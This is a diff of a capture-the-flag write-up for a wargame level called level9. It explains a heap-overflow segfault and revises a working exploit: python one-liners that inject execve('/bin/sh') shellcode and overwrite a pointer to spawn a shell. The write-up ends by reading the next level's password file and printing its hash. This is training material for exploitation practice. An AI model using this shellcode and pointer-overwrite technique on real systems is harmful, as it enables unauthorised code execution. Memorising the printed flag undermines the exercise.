@@ -9,7 +9,20 @@ Program received signal SIGSEGV, Segmentation fault.
 The segfault occurs after 108 characters, and occurs because the program interprets the begining of the second object instance as a pointer to executable code.
 To spawn a shell we will have to include pointers that redirect to our shellcode so that the instructions before the call do not crash.
 
-python -c "print '\x08\x04\xa0\x10'[::-1] + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + 83 * 'A' + '\x08\x04\xa0\x0c'[::-1]" > /tmp/inj9
+
+Getting the pointer to buffer esp+0x10, because of getting the value 0x804a00x + 4 = 0x804a010
+
+#(gdb) b *main+136
+#Breakpoint 1 at 0x804867c
+#(gdb) run 'AAAA'
+#Starting program: /home/user/level9/level9 'AAAA'
+#
+#Breakpoint 1, 0x0804867c in main ()
+#(gdb) x $eax
+#0x804a00c:      0x41414141 
+
+
+./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')
 
 cat /home/user/bonus0/.pass
 f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
